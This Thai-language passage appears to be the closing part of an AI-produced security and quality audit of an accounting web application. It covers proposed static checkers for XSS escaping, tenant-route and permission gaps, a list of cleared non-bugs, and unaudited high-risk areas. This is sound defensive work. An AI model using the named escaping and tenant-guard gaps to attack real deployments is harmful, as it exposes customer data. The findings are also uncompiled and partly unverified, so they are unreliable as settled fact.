| H-A22 | P2 | journals.html ไม่มี dimensionId (documents.html:8154, general-ledger.html:282 มี) | สมุดรายวันมือระบุมิติไม่ได้ทั้งที่ JournalEntryLine.DimensionId มี | รายงานต้นทุนต่อศูนย์ขาดรายการปรับปรุง | select มิติต่อบรรทัด | S |
| H-A23 | P3 | deposits.html:13 redirect ตั้งใจ + markup/JS เก่า ~290 บรรทัดใต้ redirect | กับดัก drift | | ตัดเนื้อในเหลือ redirect | S |

## ของที่ไม่มีใครเรียก: ApiKey.Scopes/WebhookUrl/WebhookSecret/IsSandbox/BranchId/ConnectorType (ApiKey.cs:32-60) · IUsageMeteringService.RecordAsync (call site เดียวที่เข้าไม่ถึง) · IECommerceService ทั้งชุด · IInventoryCostingService ฝั่ง POS · ThaiDate ฝั่ง POS/TimeBilling/FixedAsset · ErpSyncFailed · Company.IsRetailApproved/PhoR06 · InventoryWriteDownAllowance/LCNRV/ArAgingBucket (ยังไม่เริ่ม) · ISlipOcrAssistService (น่าใช้ซ้ำกับ CMS slip + ธนาคาร) · FixedAsset needs-review endpoint (:43 หน้าเว็บกรองเอง)
## Re-design/ตัดทิ้ง: ตัด/พัก Open Banking sync (คืน NotImplemented) · E-commerce ถ้าไม่มีลูกค้ารอ → ลบ service+controller+api.js · R3 ชั้นสต๊อกทางเข้าเดียว `IStockPostingService.ApplyAsync` (5 เส้นเขียนสต๊อกคนละแบบ) · R4 Connected API onboarding ฟอร์มเดียวใน /connect (scope→sandbox→production, 6 ฟิลด์มีอยู่แล้ว) · R5 สาขาเฟส 2 ครึ่งแรก (JE สืบทอด BranchId)
## ลำดับที่แนะนำ: A1 → A4+A16+A18 → A2+A3 → A13 → A15 → A8/A9
## ยังไม่ได้อ่าน: cms-edit.html 2,733 + CmsContentService/CmsRenderingService (XSS เนื้อหา, publish/preview drift) · LineBotService flow อนุมัติ/OCR ผ่าน LINE · EmailScheduleService/ScheduledReportDispatcher/เทมเพลต · pos-floorplan/kds/modifiers/packages/reservations · warehouse/consignment/production/product-aliases · **SignatureApprovalService.ExternalApproveQuotationAsync (เส้นอนุมัติภายนอก — ตรวจลำดับต้น)** · /connect portal + workbench.html


---

## §8 checker ใหม่ที่ควรมี (ทุกตัวต้องผ่าน negative test ก่อน ship)

| ชื่อ | กติกา | negative test | จับข้อ |
|---|---|---|---|
| `esc_attr_check.py` | tokenize template literal ติดตามสถานะ HTML · `${}` ในค่า attribute ที่ผ่าน esc ไม่ครอบ quote หรือไม่ผ่านเลย → ฟ้อง | `title="${Layout.esc(x)}"` ฟ้อง · `_esc` ไม่ฟ้อง · `<td>${Layout.esc(x)}</td>` ไม่ฟ้อง | G-01/02 |
| `inline_handler_data_check.py` | `on*="…('${expr}'…)"` ที่ expr ไม่ใช่ GUID/ตัวเลข → ฟ้องไม่ว่าห่อ esc อะไร | `&apos;` ต้องยังฟ้อง | G-03 |
| `innerhtml_escape_check.py` | `innerHTML =` ที่ไม่ผ่าน tagged template `tpl` | admin/users.html:133 | F-01, G-04/05 |
| `util_class_check.py` | class รูปทรง utility ที่ไม่มีนิยามใน css (เรพไม่มี Tailwind) — **เขียนแล้ว ผ่าน negative test** | แทรก `class="px-7 grid-cols-9"` → 4→6 ชื่อ | G-26 |
| `double_submit_check.py` | async save/submit/approve/pay/post/void/delete/send ที่ await api แต่ไม่มี disabled/in-flight | ห่อ Layout.once → หยุดฟ้อง | G-12 |
| `api_wrapper_bypass_check.py` | หน้าเขียน `API.post(\`/api/companies/${}/path\`)` ตรงทั้งที่ api.js มี wrapper | ลบ wrapper etaxQuickSubmit → หยุดฟ้อง etax.html:375 | G-07 |
| `undefined_method_check.py` | `this.x(`/`Page.x(` ที่ไม่มีนิยามใน object เดียวกัน + `getElementById('id')` ที่ไม่มี id ในหน้า | Page.edit / fSubTotal | A-D3/D4/D6/D12 |
| `query_param_reader_check.py` | `?key=`/`&key=` ใน href/location ของ wwwroot เทียบ `params.get('key')` ในหน้าปลายทาง | `?create=` | B-A2/A3/A8 |
| `dead_link_check.py` (ขยาย) | ครอบ `<link href>` + `<script src>` ภายใน | /css/layout.css · /js/export-util.js | B-A5/A9 |
| `tenant_route_check.py` | endpoint `[Authorize]` ที่รับ id ของ entity ที่มี CompanyId แต่ route ไม่มี `{companyId}` และไม่ติด `[NonTenantScoped]` และบริการไม่เรียก ITenantGuard | Subscription payments/{paymentId} | F-02 |
| `doc_permission_check.py` | action ใน DocumentController/PayrollController ที่เขียนข้อมูลแต่ไม่มี DocumentPermissionHelper/CheckPayrollAccessAsync/[DocPermission] (แม่แบบ admin_menu_gate_check) | PUT /document | A-D2, D-A1 |
| `sequence_lock_check.py` (ขยาย advisory_lock_key_check) | `Max(...Number)`/`OrderByDescending(Number)` + `+1` ที่ไม่อยู่ใต้ AdvisoryLockKey.For | WhtCreditService:436 | F-08 |
| `js_dup_method_check.py` (แก้) | จับ key ซ้ำใน `return {` และค่าของ property ด้วย (ตอนนี้เก็บเฉพาะ depth==1 จาก `name = {`) | api.js:576,638 payPayroll | D-Z2 |
| `tax_literal_check.py` | `<option value=` ที่มี `40(` หรือ `%` ในหน้าภาษี เทียบ endpoint ตารางกฎหมาย | wht.html:847 | C-T06 |
| **ไม่เขียนตอนนี้** | th scope / label for — ผิด 100% จะฟ้องทุกบรรทัด รอแก้ก่อนแล้วตั้งเป็นด่านกันถอยหลัง | | G-14 |

## §9 ตรวจแล้ว **ไม่ใช่บั๊ก** — ห้ามรายงานซ้ำ

- SignatureApprovalController IDOR (ทีม F ถอนเอง) — endpoint อยู่ใต้ `api/companies/{companyId:guid}/approvals` guard ครอบ · UserSignatureController ผูก userId จาก JWT
- `IgnoreQueryFilters` 40 จุด ไม่ใช่ช่องรั่ว tenant — global filter = `!IsDeleted` เท่านั้น ทุกจุดที่สุ่มมี CompanyId
- `ThaiTaxIdValidator` ไม่ใช่สำเนา checksum ซ้ำแล้ว (delegate ไป ThaiTaxId, ถูกเรียก 4 จุด)
- `CostingMethod.Fifo` มี layer จริง (InventoryCostingService.cs:135-185) — ผิดเฉพาะเส้น POS ที่ไม่เรียก (H-A8)
- `pages/deposits.html` / `pages/dashboard.html` = redirect stub ตั้งใจ (กฎ URL เดิมต้องอยู่) — แค่ตัดเนื้อในเก่า (H-A23)
- `pages/design-system.html` จงใจไม่ใส่เมนู (layout.js:1034-1036)
- CMS มี subdomain/custom-domain routing จริง (CmsSiteRoutingMiddleware.cs:61-106)
- `projects.html openEdit` ซ้ำ และ `signatures-logic.js selectedCompanyId` แก้แล้ว
- `PermissionKeys.Catalog` ถูกใช้จริง (roles.html:351-370 ดึงจาก /permission-catalog)
- `Math.Round` ที่ WhtCreditService.cs:103,163,185 · TaxFilingExportService.cs:505-506 = บวก/ลบค่า 2dp no-op ไม่ใช่บั๊ก (C-T17) · `netProfit × 0.20m` (:1011) ไม่ตกกึ่งกลาง — เติม AwayFromZero ได้แต่เรียกว่า "ป้องกัน"
- ทีม G รอบแรกนับหน้า orphan ได้ 49 (เกณฑ์ ≤1 ref ผิดเพราะ navItems href นับ 1) — แก้เกณฑ์แล้วเหลือ 2 ตรงกับ grep ของ main
- DateTime.Now = 0 จุด (UTC สม่ำเสมอ) · appsettings ไม่มี secret hardcode · webhook/LINE HMAC ใช้ FixedTimeEquals · Idempotency-Key อยู่ใน DB แล้ว
- 15 คอมมิตล่าสุด (SSO/PDPA/ปกส./TIV) ไม่ถูกรายงานซ้ำ — ทุกทีมตรวจ git log ก่อน

## §10 สิ่งที่ยังไม่ได้ตรวจ (ควรเป็นรอบถัดไป เรียงตามความเสี่ยง)

1. **SignatureApprovalService.ExternalApproveQuotationAsync** — เส้นอนุมัติจากภายนอก (ทีม H+F ชี้ตรงกัน) เสี่ยงคลาส "GET เปลี่ยนสถานะ"
2. **PayslipLineDeliveryService + PayslipPublicController** — ลิงก์สาธารณะสลิป (token/หมดอายุ/รั่วข้ามพนักงาน) + ไม่อยู่ใน tier rate limit
3. **ImpersonationReadonlyMiddleware** — เส้น impersonation ข้ามบริษัท
4. **CMS storefront anonymous 35 endpoint** — scope siteId+companyId ในบริการทุกเมธอด · cms-edit.html 2,733 บรรทัด (XSS เนื้อหาผู้ใช้)
5. **EtaxInvoiceService / PdfA3** — checklist F ทั้งข้อ (UBL 2.1 · XAdES-BES · submission cron ภายในวันที่ 15) ไม่มีทีมไหนไล่ลึก
6. **DocumentService อีก ~12k บรรทัด** — Approve เต็ม · Void · Convert core · PaymentVoucher/GRN JE branch · CompanyId ทีละ query
7. **WithholdingTaxCertService / WhtCertAmountResolver / PndTextFileFormat** — รวมยอด 50 ทวิ · 2 ฉบับ · format ภ.ง.ด.3/53 · X5 ภ.ง.ด.1ก 14 vs 16 คอลัมน์
8. **LineBotService** flow อนุมัติ/OCR ผ่าน LINE (784 บรรทัด)
9. **FixedAssetService** คณิตค่าเสื่อม DecliningBalance/pro-rata/ทบทวนอายุ
10. **รันจริงในเบราว์เซอร์** (contrast/touch-target/360px) และ **ยิง F-01/F-02 บน staging**
11. ยัง**ไม่ verify กฎหมาย**: เพดาน ปกส. 17,500 ปี 2026 (D-S4) · ส่วนขยาย e-Filing ปกส. (D-S5) · layout ภ.ง.ด.1ก (D-X5) — ต้องให้นักบัญชี/ที่ปรึกษายืนยัน

## §11 เอกสารที่ต้อง sync เมื่อลงมือ

- `DOCUMENT_FLOW.md`: D-14 (endpoint `/documents` → `/document` + file:line ผิดทั้ง 5 จุดที่สุ่ม — เปลี่ยนเป็นชื่อเมธอด) · เพิ่ม IsClosingEntry/period lock · Pp30Box · InternalNotes ack
- `ACCOUNT_STRUCTURE.md`: §3.1 Connected API ติด ✅ ทั้งที่ใช้ไม่ได้ (H-A4) → 🔨 · §5 ข้อ 2 (H-A19) · §3.1a สาขาเฟส 2
- `CLAUDE.md`: "Tailwind CDN" → "utility subset ใน css/style.css" (G-29) · เพิ่ม defect class: "guard ที่ skip เมื่อ route ไม่มี companyId" · "esc ที่ไม่หนี quote" · "state ใน process" · เพิ่ม checker ใหม่ในลิสต์บังคับ
- `TEST_PLAN.md`: เพิ่มเคสต่อข้อที่แก้ (ทุก P0 ต้องมี negative test ที่ reproduce ตัวเลขก่อน)

---
_ผลิตโดย 8 subagent (Opus) + main agent (Fable 5.1) verify · 2026-09-02 · ไม่ได้คอมไพล์ — env ไม่มี .NET SDK_
